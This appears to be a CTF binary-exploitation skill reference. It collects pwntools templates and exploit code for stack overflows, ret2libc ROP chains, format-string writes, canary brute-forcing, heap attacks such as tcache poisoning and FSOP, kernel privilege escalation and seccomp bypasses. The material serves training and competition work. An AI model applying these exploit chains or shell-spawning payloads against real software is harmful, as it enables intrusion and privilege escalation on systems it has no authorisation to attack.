# ctf-pwn

## Description

Binary exploitation skill — stack/heap/kernel pwn, shellcode, ROP chains, format
strings, FSOP. Covers x86/x64/ARM/ARM64 on Linux (glibc) and Windows.

## Prerequisites

```bash
# Core
pip install pwntools --break-system-packages
apt-get install -y gdb gdb-multiarch checksec binutils python3-pwntools

# GDB plugins (one of)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
# or: pip install peda

# Libc tools
pip install one_gadget --break-system-packages
# or: gem install one_gadget

# ROPgadget
pip install ROPgadget --break-system-packages

# Heap visualization
pip install heapinspect --break-system-packages
```

## Recon Checklist

```bash
file <binary>                    # arch, stripped/not, PIE
checksec --file=<binary>         # protections: RELRO, Stack Canary, NX, PIE, RPATH
strings <binary> | grep -i flag  # quick win?
readelf -s <binary> | grep -E "system|execve|puts|printf|gets|read"
ldd <binary>                     # libc version
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
./binary                         # run once, observe behavior
```

## Stack Exploitation

### Buffer Overflow — Basic

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')  # or remote('host', port)

# Find offset
# GDB: cyclic 200 → run → cyclic -l <crash_value>
offset = cyclic_find(0x6161616b)

payload = flat(
    b'A' * offset,
    p64(elf.plt['puts']),    # ret2plt leak
    p64(elf.symbols['main']),
)
```

### ROP Chain — ret2libc

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]     # stack alignment
pop_rdi    = rop.find_gadget(['pop rdi', 'ret'])[0]

# Leak libc base
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main'],
)
p.sendlineafter(b'> ', payload)

leaked = unpack(p.recvline()[:6].ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']

# ret2system
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload2 = flat(
    b'A' * offset,
    ret_gadget,    # align stack for Ubuntu 18+
    pop_rdi,
    binsh,
    system,
)
p.sendlineafter(b'> ', payload2)
p.interactive()
```

### Format String

```python
# %p leak chain to find canary/libc/PIE
# %n write-what-where

from pwn import *
p = process('./binary')

# Leak: find offset where input appears
for i in range(1, 30):
    p.sendlineafter(b'> ', f'%{i}$p'.encode())
    val = p.recvline()
    print(f"{i}: {val}")

# Write 4-byte value to address:
target = 0xdeadbeef
addr   = 0x404050
writes = {addr: target}
payload = fmtstr_payload(offset, writes)
```

### Stack Canary Bypass

```python
# Byte-by-byte brute force (fork() server)
canary = b'\x00'
for _ in range(7):
    for byte in range(256):
        payload = b'A' * 72 + canary + bytes([byte])
        p = process('./binary')
        p.send(payload)
        if b'*** stack smashing' not in p.recvall():
            canary += bytes([byte])
            break
```

## Heap Exploitation

### tcache Poisoning (glibc 2.27–2.31)

```python
# Double-free tcache → arbitrary write
malloc(0x20)   # chunk A
malloc(0x20)   # chunk B  (prevent consolidation)
free(A)
free(A)        # double-free (2.27: no check)

# 2.32+: need to mangle pointer
# fd = (target >> 12) ^ protected_ptr
```

### House of Force (legacy)

```python
# Overwrite top chunk size to -1, then allocate to target
# glibc < 2.29
```

### IO FILE Attack / FSOP

```python
# _IO_buf_base null byte stdin hijack
# stdout TLS leak for leakless libc
# __call_tls_dtors hijack via TLS destructor

# Template: forge fake _IO_FILE structure
fake_file = FileStructure(null=0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_buf_base = 0
fake_file._IO_buf_end = target_addr
```

### Unsorted Bin Leak (glibc libc base)

```python
# Allocate large chunk (>0x408), free it → fd/bk point into main_arena (libc)
# Read those pointers to compute libc base
malloc(0x500)
malloc(0x20)   # fence
free(chunk1)   # goes to unsorted bin
# read fd pointer → libc_base = fd - main_arena_offset
```

## Kernel Exploitation

### Setup

```bash
# Extract initramfs
mkdir initramfs && cd initramfs
cpio -idmv < ../initramfs.cpio
# or: zcat initramfs.cpio.gz | cpio -idmv

# Boot QEMU
qemu-system-x86_64 \
  -kernel bzImage \
  -initrd initramfs.cpio.gz \
  -append "console=ttyS0 nokaslr nopti nosmap nosmep" \
  -nographic -s

# GDB attach
gdb vmlinux
target remote :1234
```

### ret2usr Pattern

```c
// commit_creds(prepare_kernel_cred(0))
// then return to userland with swapgs + iretq
void escalate() {
    void *(*pkc)(int) = (void*)prepare_kernel_cred_addr;
    void (*cc)(void*) = (void*)commit_creds_addr;
    cc(pkc(0));
}
// In ROP: pop rdi, 0 → prepare_kernel_cred → commit_creds → swapgs → iretq
```

### modprobe_path / core_pattern

```bash
# Write path to /proc/sys/kernel/modprobe or core_pattern via kernel write primitive
# Then trigger: execute unknown file format / cause crash
```

## Seccomp Bypass

```bash
# Dump seccomp rules
seccomp-tools dump ./binary

# Common bypasses:
# - Use openat() instead of open() if open is blocked
# - x32 ABI: syscall numbers offset by 0x40000000
# - RETF to switch x64→x32 ring
# - Use execveat() as execve alternative
```

## One-Gadget / Magic Gadget

```bash
one_gadget ./libc.so.6
# Constraints must be satisfied (rsp alignment, null registers)
# Try each candidate; use ROPgadget to set constraints
```

## GDB / pwndbg Cheatsheet

```
pwndbg> cyclic 200
pwndbg> r <<< $(python3 -c "print('A'*200)")
pwndbg> cyclic -l $rsp     # find offset

pwndbg> heap               # tcache/fastbin/unsorted view
pwndbg> bins               # all bins
pwndbg> vmmap              # memory regions with permissions
pwndbg> got                # GOT table
pwndbg> libc               # libc base (if loaded)
pwndbg> canary             # show stack canary value

# Breakpoints
b *main+42
b __libc_start_main
```

## Templates

### Remote Skeleton

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = 'challenge.ctf.io', 1337
BINARY = './binary'

context.binary = elf = ELF(BINARY)
context.log_level = 'debug'  # change to 'info' for less noise

gs = '''
set follow-fork-mode child
b *main
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript=gs)
    else:
        return process(BINARY)

p = start()

# === EXPLOIT HERE ===

p.interactive()
```

### Pwntools Useful Snippets

```python
# Unpack leak
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# ROPgadget search
rop = ROP(elf)
pop_rdi = rop.rdi.address

# SROP (sigreturn-oriented programming)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsp = rsp_addr
frame.rip = syscall_addr

# Shellcode
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.linux.sh())   # equivalent
```

## Checklist: Before Giving Up

- [ ] Did you check for `gets`/`scanf`/`read` with larger-than-buffer size?
- [ ] Did you try off-by-one NULL byte overflow?
- [ ] Did you check for UAF (use after free)?
- [ ] Is there a hidden/debug menu option?
- [ ] Did you check the `.bss`/`.data` section for useful globals?
- [ ] Did you try format string with `%s`/`%n` pointing at GOT?
- [ ] Is there integer overflow in size calculation?
- [ ] Did you check for signed/unsigned comparison bugs?
